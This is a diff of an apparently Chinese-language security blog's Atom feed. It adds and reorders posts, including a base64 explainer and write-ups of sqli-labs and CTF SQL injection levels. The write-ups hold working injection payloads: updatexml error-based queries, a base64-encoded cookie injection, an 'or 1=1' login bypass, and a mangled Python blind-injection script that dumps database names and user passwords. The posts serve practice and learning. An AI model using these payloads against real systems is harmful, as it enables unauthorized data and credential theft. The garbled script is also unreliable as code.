@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-02-23T12:28:20.561Z</updated>
+  <updated>2022-02-24T04:32:29.703Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,46 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>对于 base64 的基础理解</title>
+    <link href="http://example.com/2022/02/24/base64/"/>
+    <id>http://example.com/2022/02/24/base64/</id>
+    <published>2022-02-24T04:22:21.000Z</published>
+    <updated>2022-02-24T04:32:29.703Z</updated>
+    
+    <content type="html"><![CDATA[<p>Base64  是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。<br>Base64，是用64个可打印字符来表示二进制数据的方法。Base64的索引与对应字符的关系。<br><img src="https://s2.loli.net/2022/02/24/5ltD7ihAVGfILKS.png" alt="01.png"></p><p>将索引转换为对应的二进制数据的话需要至多6个Bit。然而ASCII码需要8个Bit来表示，6个Bit当然不能存储8个Bit的数据，但是4<em>6个Bit可以存储3</em>8个Bit的数据。如下表所示：<br><img src="https://s2.loli.net/2022/02/24/WqV2LYvNpmSiw6a.png" alt="02.png"><br>可以看到“Son”通过Base64编码转换成了“U29u”。这是刚刚好的情况，3个ASCII字符刚好转换成对应的4个Base64字符。当所转换字符不为三的倍数时一律采取补0变为3的倍数的方式来转换</p><p><img src="https://s2.loli.net/2022/02/24/gQMN1lacFVx3jkC.png" alt="03.png"></p><p>其解码编码可在网上进行<br><a href="https://base64.us/"><em>在线编码译码</em></a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;Base64  是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。&lt;br&gt;Base64，是用64个可打印字符来表示二进制数据的方法。Base64的索引与对应字符的关系。&lt;br&gt;&lt;img src=&quot;https</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>less 20 and less 21</title>
+    <link href="http://example.com/2022/02/24/20/"/>
+    <id>http://example.com/2022/02/24/20/</id>
+    <published>2022-02-24T03:55:52.000Z</published>
+    <updated>2022-02-24T04:21:37.156Z</updated>
+    
+    <content type="html"><![CDATA[<p>从源代码中我们可以看到COOKIE从username中获得值后，当再次刷新时，会从COOKIE中读取username，然后进行查询。<br>登录成功之后，我们可以修改cookie,当再次刷新的时候，这时候sql语句就会被修改，我们使用updatexml进行破解。<br><img src="https://s2.loli.net/2022/02/24/PQgf5lWRc74j2m3.png" alt="1.png"></p><pre><code>dhakkan’ and updatexml(1,concat(&#39;~&#39;,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),&#39;~&#39;),1)#</code></pre><p><img src="https://s2.loli.net/2022/02/24/CPjQtOaqcyz56EN.png" alt="2.png"></p><pre><code>dhakkan&#39; and updatexml(1,concat(&#39;~&#39;,substr((select group_concat(column_name) from information_schema.columns  where table_name=&#39;users&#39;),1,31),&#39;~&#39;),1)#</code></pre><p><img src="https://s2.loli.net/2022/02/24/yiBdurDIwLm8kAg.png" alt="3.png"></p><pre><code>dhakkan &#39;and updatexml(1,concat(0x7e,substr((select group_concat(username,&#39;~&#39;,password)from security.users),1,64),0x7e),1)#</code></pre><p><img src="https://s2.loli.net/2022/02/24/Cr9PHNa326Osvyx.png" alt="4.png"></p><p>less 21这里的界面和上一关的内容差不多，唯一的区别就是cookie使用了base64进行了加密<br>我们这里与上一关一样，修改cookie即可，唯一的附加内容就是将cookie进行base64加密：<br>cookie值为：<br>    YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM=</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;从源代码中我们可以看到COOKIE从username中获得值后，当再次刷新时，会从COOKIE中读取username，然后进行查询。&lt;br&gt;登录成功之后，我们可以修改cookie,当再次刷新的时候，这时候sql语句就会被修改，我们使用updatexml进行破解。&lt;br&gt;&lt;i</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>less18 and less19</title>
@@ -244,26 +284,6 @@ f</summary>
   </entry>
   
   <entry>
-    <title>less 8</title>
-    <link href="http://example.com/1970/01/01/less8/"/>
-    <id>http://example.com/1970/01/01/less8/</id>
-    <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-11-21T03:22:31.991Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png" alt="1.png"><br><img src="https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png" alt="2.png"><br>输入?id=1显示正常，?id=1’输入后无显示，所以可以确定存在漏洞<br>由于为无回显信息，打开python进行爆破<br>    import requests<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    for i in range(1,10):<br>    for char in dic:<br>        url=”<a href="http://www/Less-8/?id=1&#39;&quot;">http://www/Less-8/?id=1&#39;&quot;</a>      //连接题目地址<br>        1.payload=”and substr(database（）,{},1)=’{}’–+”.format(i,char) //运用循环查库</p><pre><code>    2.Payload=”and substr((select table_name from information_schema.tables     Where table.schema=database() limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char) //进行查表    3.Payload=”and substr((select column_name from #information_schema.columns     Where table.name=’users’ limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char)//进行查列    4.payload=”and substr((password from security.users limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.    Format(i,char)        //进行查询密码    url=url+payload           //    print(url)    r=requests.get(url)    if &quot;are&quot; in r.text:        flag+=char        //最后将所得出的flag打印出        print(flag)print(flag)</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png&quot;</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
     <title>easy sql</title>
     <link href="http://example.com/1970/01/01/easy%20sql/"/>
     <id>http://example.com/1970/01/01/easy%20sql/</id>
@@ -284,18 +304,18 @@ f</summary>
   </entry>
   
   <entry>
-    <title>极客easy sql</title>
-    <link href="http://example.com/1970/01/01/%E6%9E%81%E5%AE%A2easy%20sql/"/>
-    <id>http://example.com/1970/01/01/%E6%9E%81%E5%AE%A2easy%20sql/</id>
+    <title>less 8</title>
+    <link href="http://example.com/1970/01/01/less8/"/>
+    <id>http://example.com/1970/01/01/less8/</id>
     <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-11-16T13:23:47.050Z</updated>
+    <updated>2021-11-21T03:22:31.991Z</updated>
     
-    <content type="html"><![CDATA[<p>还是先尝试闭合方式， 输入1、1’、1” 判断，当输入 1’ 报错，结果语句应该为单引号闭合。<br><img src="https://i.loli.net/2021/11/16/jpu3h2tWK6fXF5a.png" alt="1.png"><br>此时就可以尝试利用联合查询进行注入<br>在用户名输入：1’ select 1,2,3–+密码输入：1<br><img src="https://i.loli.net/2021/11/16/WNsIKhPFoj2DHBY.png" alt="2.png"><br>此时会跳出<br><img src="https://i.loli.net/2021/11/16/3YL2fPJ5e7QM9Sc.png" alt="3.png"><br>说明密码1没有闭合，此时在1前再加’；<br>此时再登录会显示注入成功并没有任何过滤<br><img src="https://i.loli.net/2021/11/16/vUNOKVDQFMl1wp6.png" alt="4.png"><br>或者也可使用万能账号进行注入<br>输入1’or 1=1–+密码：’1<br><img src="https://i.loli.net/2021/11/16/RjQCxO9EALYcUuX.png" alt="5.png"><br>此时由于or后方条件恒为真，账号认定为真<br><img src="https://i.loli.net/2021/11/16/vUNOKVDQFMl1wp6.png" alt="6.png"></p>]]></content>
+    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png" alt="1.png"><br><img src="https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png" alt="2.png"><br>输入?id=1显示正常，?id=1’输入后无显示，所以可以确定存在漏洞<br>由于为无回显信息，打开python进行爆破<br>    import requests<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    for i in range(1,10):<br>    for char in dic:<br>        url=”<a href="http://www/Less-8/?id=1&#39;&quot;">http://www/Less-8/?id=1&#39;&quot;</a>      //连接题目地址<br>        1.payload=”and substr(database（）,{},1)=’{}’–+”.format(i,char) //运用循环查库</p><pre><code>    2.Payload=”and substr((select table_name from information_schema.tables     Where table.schema=database() limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char) //进行查表    3.Payload=”and substr((select column_name from #information_schema.columns     Where table.name=’users’ limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char)//进行查列    4.payload=”and substr((password from security.users limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.    Format(i,char)        //进行查询密码    url=url+payload           //    print(url)    r=requests.get(url)    if &quot;are&quot; in r.text:        flag+=char        //最后将所得出的flag打印出        print(flag)print(flag)</code></pre>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;还是先尝试闭合方式， 输入1、1’、1” 判断，当输入 1’ 报错，结果语句应该为单引号闭合。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/16/jpu3h2tWK6fXF5a.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;此时就可以尝试利用</summary>
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png&quot;</summary>
       
     
     
@@ -322,6 +342,26 @@ f</summary>
     
     
     <category term="学习进度出奇的慢" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E5%87%BA%E5%A5%87%E7%9A%84%E6%85%A2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>极客easy sql</title>
+    <link href="http://example.com/1970/01/01/%E6%9E%81%E5%AE%A2easy%20sql/"/>
+    <id>http://example.com/1970/01/01/%E6%9E%81%E5%AE%A2easy%20sql/</id>
+    <published>1970-01-01T00:00:02.021Z</published>
+    <updated>2021-11-16T13:23:47.050Z</updated>
+    
+    <content type="html"><![CDATA[<p>还是先尝试闭合方式， 输入1、1’、1” 判断，当输入 1’ 报错，结果语句应该为单引号闭合。<br><img src="https://i.loli.net/2021/11/16/jpu3h2tWK6fXF5a.png" alt="1.png"><br>此时就可以尝试利用联合查询进行注入<br>在用户名输入：1’ select 1,2,3–+密码输入：1<br><img src="https://i.loli.net/2021/11/16/WNsIKhPFoj2DHBY.png" alt="2.png"><br>此时会跳出<br><img src="https://i.loli.net/2021/11/16/3YL2fPJ5e7QM9Sc.png" alt="3.png"><br>说明密码1没有闭合，此时在1前再加’；<br>此时再登录会显示注入成功并没有任何过滤<br><img src="https://i.loli.net/2021/11/16/vUNOKVDQFMl1wp6.png" alt="4.png"><br>或者也可使用万能账号进行注入<br>输入1’or 1=1–+密码：’1<br><img src="https://i.loli.net/2021/11/16/RjQCxO9EALYcUuX.png" alt="5.png"><br>此时由于or后方条件恒为真，账号认定为真<br><img src="https://i.loli.net/2021/11/16/vUNOKVDQFMl1wp6.png" alt="6.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;还是先尝试闭合方式， 输入1、1’、1” 判断，当输入 1’ 报错，结果语句应该为单引号闭合。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/16/jpu3h2tWK6fXF5a.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;此时就可以尝试利用</summary>
+      
+    
+    
+    
     
   </entry>
   
